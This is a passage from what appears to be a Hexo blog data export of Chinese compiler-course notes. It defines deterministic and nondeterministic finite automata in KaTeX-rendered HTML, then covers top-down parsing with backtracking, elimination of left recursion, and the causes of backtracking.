encoding=\"application/x-tex\">f</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span></span></span></span>是一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Q</mi><mo>×</mo><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">Q \\times \\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>到<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Q</mi></mrow><annotation encoding=\"application/x-tex\">Q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span></span></span></span>的单射，即<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mrow><mo fence=\"true\">(</mo><msub><mi>q</mi><mi>i</mi></msub><mo separator=\"true\">,</mo><mi>a</mi><mo fence=\"true\">)</mo></mrow><mover><mo><mo>→</mo></mo><mi>f</mi></mover><msub><mi>q</mi><mi>j</mi></msub><mi mathvariant=\"normal\">，</mi><mi mathvariant=\"normal\">其</mi><mi mathvariant=\"normal\">中</mi><msub><mi>q</mi><mi>i</mi></msub><mo separator=\"true\">,</mo><msub><mi>q</mi><mi>j</mi></msub><mo>∈</mo><mi>Q</mi><mo separator=\"true\">,</mo><mi>a</mi><mo>∈</mo><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\left(q_{i},a\\right)\\stackrel{f}{\\rightarrow} q_{j}，其中q_{i},q_{j} \\in Q,a \\in \\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.450086em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.200086em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">→</span></span></span><span style=\"top:-3.613978em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10764em;\">f</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8252079999999999em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">其</span><span class=\"mord cjk_fallback\">中</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mo>∈</mo><mi>Q</mi></mrow><annotation encoding=\"application/x-tex\">S \\in Q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72243em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span></span></span></span>是唯一的一个初态；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Z</mi><mo>⊆</mo><mi>Q</mi></mrow><annotation encoding=\"application/x-tex\">Z \\subseteq Q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8193em;vertical-align:-0.13597em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⊆</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span></span></span></span>是终态集合。</li>\n</ol>\n<p>当前状态为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>q</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">q_{i}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>、输入字符为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span></span></span></span>时，自动机就转换到下一个状态<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>q</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">q_{j}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>。此时<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>q</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">q_{j}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>称为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>q</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">q_{i}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>的一个后继状态。</p>\n<p>单射的意义：任意一个状态与输入的二元组都<strong>唯一</strong>确定了下一个状态。</p>\n<p>一个DFA可以用一个矩阵表示，也可以用图表示。</p>\n<ul>\n<li>用矩阵表示时，行表示状态，列表示输入符号，矩阵元素表示<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>f</mi><mrow><mo fence=\"true\">(</mo><mi>q</mi><mo separator=\"true\">,</mo><mi>a</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">f\\left(q,a\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span></li>\n<li>用图表示时，假设有m个状态和n个输入字符，则图含有m个状态结，每个状态结<strong>最多</strong>有n条<strong>箭弧</strong>与别的状态结连接。整个图含有<strong>唯一</strong>一个初态结和多个终态结。</li>\n<li>对于<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msup><mi mathvariant=\"normal\">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\Sigma^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.688696em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">Σ</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>中的任意符号串<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>，若存在一条路从初态结到终态结，且这条路上所有的符号连成的符号串等于<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>，则称：<strong><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>被DFA <span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>M</mi></mrow><annotation encoding=\"application/x-tex\">M</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">M</span></span></span></span>所识别</strong>。</li>\n<li>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>M</mi></mrow><annotation encoding=\"application/x-tex\">M</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">M</span></span></span></span>的初态结也是终态结，那么<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>也可以被识别。</li>\n<li>DFA <span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>M</mi></mrow><annotation encoding=\"application/x-tex\">M</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">M</span></span></span></span>可识别的符号串的全体记为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><mi>M</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(M\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">M</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</li>\n</ul>\n<h4 id=\"非确定有穷自动机-nfa\"><a class=\"markdownIt-Anchor\" href=\"#非确定有穷自动机-nfa\"></a> 非确定有穷自动机 NFA</h4>\n<p>一个NFA也是一个五元组<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>M</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><mi>Q</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">Σ</mi><mo separator=\"true\">,</mo><mi>f</mi><mo separator=\"true\">,</mo><mi>S</mi><mo separator=\"true\">,</mo><mi>Z</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">M=\\left(Q,\\Sigma,f,S,Z\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">Q</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">Σ</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>，其中</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Q</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">Σ</mi><mo separator=\"true\">,</mo><mi>Z</mi></mrow><annotation encoding=\"application/x-tex\">Q,\\Sigma,Z</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">Σ</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span></span></span></span>与DFA中相同；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>f</mi></mrow><annotation encoding=\"application/x-tex\">f</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span></span></span></span>不再是单射，而是一个<strong>多值</strong>函数，映射出一个集合；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>f</mi><mrow><mo fence=\"true\">(</mo><msub><mi>q</mi><mi>i</mi></msub><mo separator=\"true\">,</mo><mi>a</mi><mo fence=\"true\">)</mo></mrow><mo>=</mo><mrow><mo fence=\"true\">{</mo><mi mathvariant=\"normal\">某</mi><mi mathvariant=\"normal\">些</mi><mi mathvariant=\"normal\">状</mi><mi mathvariant=\"normal\">态</mi><mi mathvariant=\"normal\">的</mi><mi mathvariant=\"normal\">集</mi><mi mathvariant=\"normal\">合</mi><mo fence=\"true\">}</mo></mrow></mrow><annotation encoding=\"application/x-tex\">f\\left(q_{i},a\\right)=\\left\\{某些状态的集合\\right\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">{</span><span class=\"mord cjk_fallback\">某</span><span class=\"mord cjk_fallback\">些</span><span class=\"mord cjk_fallback\">状</span><span class=\"mord cjk_fallback\">态</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">集</span><span class=\"mord cjk_fallback\">合</span><span class=\"mclose delimcenter\" style=\"top:0em;\">}</span></span></span></span></span>；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mo>⊂</mo><mi>Q</mi></mrow><annotation encoding=\"application/x-tex\">S \\subset Q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72243em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⊂</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span></span></span></span>是<strong>非空初态集</strong>。</li>\n</ol>\n<ul>\n<li>NFA允许状态图中，边的标记为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>。</li>\n<li></li>\n</ul>\n"},{"title":"语法分析知识点","top_img":false,"cover":"/img/compiler.jpg","date":"2020-11-24T06:11:50.000Z","katex":true,"_content":"\n## 语法分析的方法\n\n### 自上而下分析法\n\n基本思想：对任何输入串，试图用一切可能的方法，从文法的开始符号出发，反复使用各种产生式，寻找匹配的推导。\n\n方法：反复把产生式的左部符号替换成右部，从数根开始构造语法树。**寻找一个最左推导**，而本质上是一个穷举过程。\n\n#### 例子 \n文法$G\\left[S\\right]$：\n$$\n\\begin{aligned}\nS &\\rightarrow aAb\t\\\\\nA &\\rightarrow de|d\n\\end{aligned}\n$$\n\n对于输入串$W=adb$，从左到右地匹配。\n1. 首先输入流指针指向第一个字符$a$，以开始结点$S$构造语法树，如下。（hexo显示mermaid还要装插件，懒得弄了）\n```mermaid\ngraph TB\n    S --- a\n    S --- A\n    S --- b\n```\n2. 此时最左子节点是终结字符$a$，与输入流指针指向的字符相同。因此该指针指向下一个字符$d$。\n3. 对于下一个结点$A$，它是一个非终结字符，它会产生两颗语法树。如图：\n\n```mermaid\ngraph TB\n    S --- a\n    S --- A\n    S --- b\n    A --- d\n    A --- e\n```\n\n```mermaid\ngraph TB\n    S --- a\n    S --- A\n    S --- b\n    A --- d\n```\n\n4. 先选择第一棵语法树，$d$和$d$匹配，输入流指针再次转移到下一个字符$b$。而$b$和语法树中的字符$e$不一致，匹配失败。\n5. 因为第一棵语法树失败了，因此要回溯，选择第二课语法树。输入流指针重新指向第二个字符$d$。\n6. 和之前一样，指针指向的字符$d$和语法树中的$d$匹配，指针指向下一个$b$。而$b$也和语法树中的第三个子节点$b$相匹配，此时语法树的子节点也被遍历完了，匹配成功。$W=adb$确实是文法的句子。\n\n#### 自上而下的问题\n自上而下本质上是最左推导的穷举方法，还带**回溯**，效率极低，因此在使用自上而下分析法的时候，需要对文法有一定的限制：**无左递归**和**无回溯**。\n\n#### 为什么需要消除左递归？\n显然，左递归会引起死循环。\n\n#### 左递归的消除\n\n如果文法中存在推导$A\\stackrel{+}{\\Rightarrow}A\\alpha$，则存在左递归。可以直接对左递归的规则进行等价变换。\n\n若存在非终结字符的直接左递归规则：\n$$\nA \\rightarrow A\\alpha|\\beta\n$$\n其中，$\\alpha$是任意符号串，而$\\beta$不以$A$开头，则可以写成等价右递归：\n$$\n\\begin{aligned}\n&A \\rightarrow \\beta A^{'}\\\\\n&A^{'} \\rightarrow \\alpha A^{'}|\\epsilon\n\\end{aligned}\n$$\n对于一般情况：\n$$\nA \\rightarrow A \\alpha_{1}|A \\alpha_{2}|\\dots|A \\alpha_{m}|\\beta_{1}|\\beta_{2}|\\dots|\\beta_{n}\n$$\n可以写成：\n$$\n\\begin{aligned}\n&A \\rightarrow \\beta_{1}A^{'}|\\beta_{2}A^{'}|\\dots|\\beta_{n}A^{'}\\\\\n&A^{'} \\rightarrow \\alpha_{1}A^{'}|\\alpha_{2}A^{'}|\\dots|\\alpha_{m}A^{'}|\\epsilon\n\\end{aligned}\n$$\n可以进一步写成：\n$$\n\\begin{aligned}\n&A \\rightarrow A^{''}A^{'}\\\\\n&A^{''}\\rightarrow \\beta_{1}|\\beta_{2}|\\dots|\\beta_{n} \\\\\n&A^{'} \\rightarrow A^{'''}A^{'}|\\epsilon \\\\\n&A^{'''} \\rightarrow \\alpha_{1}|\\alpha_{2}|\\dots|\\alpha_{m}\n\\end{aligned}\n$$\n\n#### 回溯消除\n\n为什么会产生回溯？因为在遇到非终结字符挑选候选式的时候，可能会有多个候选式符合要求。具体有两种情况：\n1. 相同左部的**规则**，产生式右部左端的第一个终结字符相同。\n2. 